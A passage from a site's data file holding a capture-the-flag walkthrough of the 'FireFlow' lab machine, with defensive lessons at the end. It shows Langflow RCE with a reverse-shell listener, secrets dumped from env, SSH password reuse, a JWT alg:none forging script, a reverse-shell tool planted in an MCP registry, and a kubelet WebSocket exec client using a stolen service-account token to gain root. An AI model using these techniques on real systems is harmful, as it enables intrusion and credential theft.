          <img src="assets/writeups/htb-fireflow/06-exploit-script.png" alt="exploit.py source open in Mousepad" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <pre class="code-block" data-lang="bash"><code>python3 exploit.py --url https://flow.fireflow.htb/ --flow-id FLOW_ID --lhost LHOST --lport LPORT</code></pre>
          <img src="assets/writeups/htb-fireflow/07-exploit-run.png" alt="Running exploit.py against the target" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>With a listener running and the script pointed at the target, the callback landed
          almost immediately:</p>
          <pre class="code-block" data-lang="bash"><code>nc -nvlp 4444</code></pre>
          <img src="assets/writeups/htb-fireflow/08-reverse-shell.png" alt="nc listener catching the www-data reverse shell" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <pre class="code-block code-output" data-lang="text"><code>$ whoami
www-data</code></pre>
          <p>The underlying bug is the same regardless of how you trigger it: the build endpoint
          walks an attacker-supplied flow graph and compiles each node's custom component code,
          and a plain top-level assignment statement inside that code gets executed as a side
          effect of compiling the class, before the flow itself ever actually runs. Wrap that
          assignment in just enough boilerplate to pass the server's structural validation and you
          have unauthenticated RCE.</p>
          <p>Once in as <code>www-data</code>, I dumped the process environment, since application
          secrets and credentials frequently leak that way:</p>
          <pre class="code-block" data-lang="bash"><code>env</code></pre>
          <img src="assets/writeups/htb-fireflow/09-env-dump.png" alt="env output leaking LANGFLOW_SUPERUSER_PASSWORD" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Sitting right there was <code>LANGFLOW_SUPERUSER_PASSWORD</code>. Checking
          <code>/etc/passwd</code> for interactive accounts turned up exactly one real user besides
          root:</p>
          <pre class="code-block" data-lang="bash"><code>cat /etc/passwd</code></pre>
          <img src="assets/writeups/htb-fireflow/10-etc-passwd.png" alt="/etc/passwd listing showing the nightfall user" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Password reuse between an application's own superuser account and a real system
          account is one of the most common misconfigurations out there, so I tried the Langflow
          password directly against <code>nightfall</code> over SSH rather than spawning a
          <code>su</code> session from the web shell:</p>
          <pre class="code-block" data-lang="bash"><code>ssh nightfall@fireflow.htb</code></pre>
          <img src="assets/writeups/htb-fireflow/11-ssh-login.png" alt="SSH login as nightfall accepting the host key" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>It worked, and the user flag was sitting in the home directory:</p>
          <pre class="code-block" data-lang="bash"><code>whoami
cat user.txt</code></pre>
          <img src="assets/writeups/htb-fireflow/12-user-flag.png" alt="whoami confirming nightfall, and the user flag" class="writeup-img" data-lightbox="gallery-htb-fireflow">`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p><code>sudo -l</code> came back empty and a quick SUID sweep didn't turn up
          anything useful, so I went looking through nightfall's home directory instead. A hidden
          <code>.mcp</code> folder held a <code>config.json</code> with credentials for something
          I hadn't seen yet:</p>
          <pre class="code-block" data-lang="bash"><code>cat .mcp/config.json</code></pre>
          <img src="assets/writeups/htb-fireflow/13-mcp-config.png" alt=".mcp/config.json contents leaking MCP tool registry credentials" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Port 30080 wasn't something Nmap had surfaced from outside, which made sense once I
          realized it was a Kubernetes NodePort — reachable directly on the node's IP without
          needing to be on the pod network. Querying the service's version endpoint described it
          as an MCP (Model Context Protocol) AI Tool Registry, and its self-documented auth block
          was the real find: alongside the expected HS256 signing algorithm, it also listed
          <code>none</code> as a supported JWT algorithm.</p>
          <pre class="code-block" data-lang="bash"><code>curl http://TARGET_IP:30080/api/v1/version</code></pre>
          <img src="assets/writeups/htb-fireflow/14-mcp-version.png" alt="Version endpoint response listing JWT alg: none as supported" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Supporting <code>alg: none</code> means the server will accept a JWT with an empty
          signature and trust whatever claims are inside it — a classic JWT implementation flaw. I
          authenticated normally first with the leaked credentials to see what a legitimate token
          looked like:</p>
          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/auth \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"langflow-bot","password":"REDACTED"}'</code></pre>
          <img src="assets/writeups/htb-fireflow/15-mcp-auth-token.png" alt="Legitimate role:user token returned by the auth endpoint" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Decoding the returned token showed a payload along the lines of
          <code>sub: langflow-bot, role: user</code>. Since registering new tools on the registry
          was gated behind an admin role, I wrote a small script to forge my own token with the
          role bumped up and the algorithm set to <code>none</code>:</p>
          <img src="assets/writeups/htb-fireflow/16-jwt-forge-script.png" alt="jwt.py forging script open in Mousepad" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <pre class="code-block" data-lang="python"><code>import jwt
print(jwt.encode({"sub": "langflow-bot", "role": "admin"}, key="", algorithm="none"))</code></pre>
          <img src="assets/writeups/htb-fireflow/17-jwt-forged-token.png" alt="Running jwt.py and printing the forged alg:none admin token" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Before reaching for a real payload, I proved the admin token actually worked by
          registering a harmless test tool first:</p>
          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/tools \\
  -H "Authorization: Bearer ADMIN_JWT" \\
  -H 'Content-Type: application/json' \\
  -d '{"name":"x","description":"x","code":"print(1)"}'</code></pre>
          <img src="assets/writeups/htb-fireflow/18-register-test-tool.png" alt="Registering the harmless test tool x with the admin token" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/mcp \\
  -H "Authorization: Bearer ADMIN_JWT" \\
  -H 'Content-Type: application/json' \\
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"x","arguments":{}}}'</code></pre>
          <img src="assets/writeups/htb-fireflow/19-verify-rce.png" alt="Calling tool x and getting back text: 1, confirming code execution" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>With RCE confirmed, I registered the real payload — a tool whose code field was a
          small self-restarting Python reverse shell:</p>
          <pre class="code-block" data-lang="bash"><code>curl -X POST http://TARGET_IP:30080/api/v1/tools \\
  -H "Authorization: Bearer ADMIN_JWT" \\
  -H 'Content-Type: application/json' \\
  -d '{"name":"exploitnotes","description":"notes","code":"REVERSE_SHELL_PY"}'</code></pre>
          <img src="assets/writeups/htb-fireflow/20-register-shell-tool.png" alt="Registering the exploitnotes reverse-shell tool" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>The pod kept restarting and dropping the shell every time it got invoked, so rather
          than re-running the two curl commands by hand each time, I wrapped them in a small
          script that registers the tool and immediately triggers it:</p>
          <pre class="code-block" data-lang="bash"><code>#!/bin/bash
# shell.sh — register the exploitnotes tool and trigger it in one shot
curl -s -X POST http://TARGET_IP:30080/api/v1/tools \\
  -H "Authorization: Bearer ADMIN_JWT" \\
  -H 'Content-Type: application/json' \\
  -d '{"name":"exploitnotes","description":"notes","code":"REVERSE_SHELL_PY"}' > /dev/null

curl -s -X POST http://TARGET_IP:30080/mcp \\
  -H "Authorization: Bearer ADMIN_JWT" \\
  -H 'Content-Type: application/json' \\
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"exploitnotes","arguments":{}}}' > /dev/null</code></pre>
          <img src="assets/writeups/htb-fireflow/21-shell-persistence-script.png" alt="shell.sh wrapper script and it being run" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>The listener caught a connection, and the hostname confirmed I was inside a
          Kubernetes pod rather than back on the Linux host:</p>
          <pre class="code-block code-output" data-lang="text"><code>$ id
uid=1000(mcp) gid=65534(nobody)
$ hostname
mcp-server-HASH</code></pre>
          <img src="assets/writeups/htb-fireflow/22-mcp-pod-shell.png" alt="Listener catching the mcp-server pod shell" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>A quick check of the environment confirmed it was a genuine Kubernetes workload and
          not just a container named to look like one:</p>
          <pre class="code-block" data-lang="bash"><code>env | grep -i kubernetes</code></pre>
          <img src="assets/writeups/htb-fireflow/23-k8s-env.png" alt="env | grep -i kubernetes confirming a Kubernetes pod" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Every pod running with a service account mounts that account's token at a predictable
          path, so I grabbed it to interact with the Kubernetes API directly:</p>
          <pre class="code-block" data-lang="bash"><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></pre>
          <p>The service account turned out to carry just one meaningful permission beyond the
          basics: <code>get</code> on <code>nodes/proxy</code>. That single permission is enough
          to turn the Kubernetes API server into a pass-through to the kubelet running on the
          node — effectively talking to the kubelet's own HTTP API at a nodes proxy path without
          ever needing direct network access to port 10250.</p>
          <p>Using that proxy path, I listed the pods scheduled on the node and found one that
          immediately stood out: a <code>prometheus-node-exporter</code> pod in the
          <code>monitoring</code> namespace. By design, node-exporter pods run as root, mount the
          host's root filesystem so they can report real disk and system metrics, and run with
          <code>hostPID</code> and <code>hostNetwork</code> enabled — which makes a node-exporter
          pod one of the best container-escape targets you can find in any cluster.</p>
          <p>The kubelet's exec endpoint runs over a WebSocket rather than plain HTTP, and
          critically it's not gated by the same <code>create</code> permission the API server
          enforces on the HTTP exec path — a <code>get</code>-level token is enough to open the
          WebSocket channel and run a command inside the target container. I wrote a small Python
          client, <code>/tmp/evil.py</code>, that connects straight to the kubelet's exec
          WebSocket, authenticates with the stolen service account token, and runs a command
          inside the node-exporter container:</p>
          <img src="assets/writeups/htb-fireflow/24-evil-py-script.png" alt="/tmp/evil.py WebSocket exec script being written" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <pre class="code-block" data-lang="python"><code>import asyncio, ssl, sys, websockets

TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
URL = (
    "wss://NODE_IP:10250/exec/monitoring/"
    "prometheus-prometheus-node-exporter-xxxxx/node-exporter"
    "?output=1&error=1&command=" + "&command=".join(sys.argv[1].split())
)

async def run():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    async with websockets.connect(
        URL, ssl=ctx,
        additional_headers={"Authorization": "Bearer " + TOKEN},
        subprotocols=["v4.channel.k8s.io"]
    ) as ws:
        while True:
            data = await ws.recv()
            print(data[1:].decode(errors="replace"), end="")

asyncio.run(run())</code></pre>
          <pre class="code-block" data-lang="bash"><code>python3 evil.py "id"</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)</code></pre>
          <img src="assets/writeups/htb-fireflow/25-root-id.png" alt="python3 evil.py id returning uid=0(root)" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Root, inside a container whose whole job is to mirror the host filesystem.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<p><b>User flag</b> — retrieved from nightfall's home directory after reusing the
          leaked Langflow superuser password over SSH.</p>
          <p><b>Root flag</b> — read through the node-exporter pod's host filesystem mount after a
          direct WebSocket exec to the kubelet as root.</p>
          <pre class="code-block" data-lang="bash"><code>python3 evil.py "cat /host/root/root/root.txt"</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li><b>AI workflow builders that execute user-supplied code need real sandboxing, not
              just an auth check.</b> The underlying flaw here wasn't missing authentication so
              much as arbitrary code execution by design on a code path that happened to also skip
              authentication.</li>
            <li><b>Secrets don't belong in process environment variables for production
              services.</b> A superuser password sitting in <code>env</code> output is one
              <code>www-data</code> shell away from a full account takeover.</li>
            <li><b>Password reuse between service accounts and real system accounts collapses your
              whole privilege boundary into one secret.</b> One leaked application password became
              a direct SSH login.</li>
            <li><b>Never advertise <code>alg: none</code> as a supported JWT algorithm, and never
              trust the algorithm field in an incoming token at all.</b> The verifier should pin
              the expected algorithm itself rather than reading it from the token.</li>
            <li><b><code>nodes/proxy</code> with <code>get</code> is a far more dangerous
              permission than it looks.</b> It was enough, on its own, to pivot from a single
              compromised pod to arbitrary command execution on any other pod on the same node,
              including ones running as root with the host filesystem mounted.</li>
            <li><b>Monitoring and metrics pods are frequently the most privileged thing running in
              a cluster.</b> node-exporter needs root and a host mount to do its job honestly,
              which makes it one of the first things worth checking for in any Kubernetes
              pentest.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>ffuf</li><li>FeroxBuster</li><li>CVE-2026-33017 PoC</li><li>SSH</li><li>curl</li><li>PyJWT</li><li>Kubernetes API Proxy</li><li>Python (websockets)</li></ul>`
      }
    ]
  }
];

WRITEUPS.sort((a, b) => new Date(b.date) - new Date(a.date));
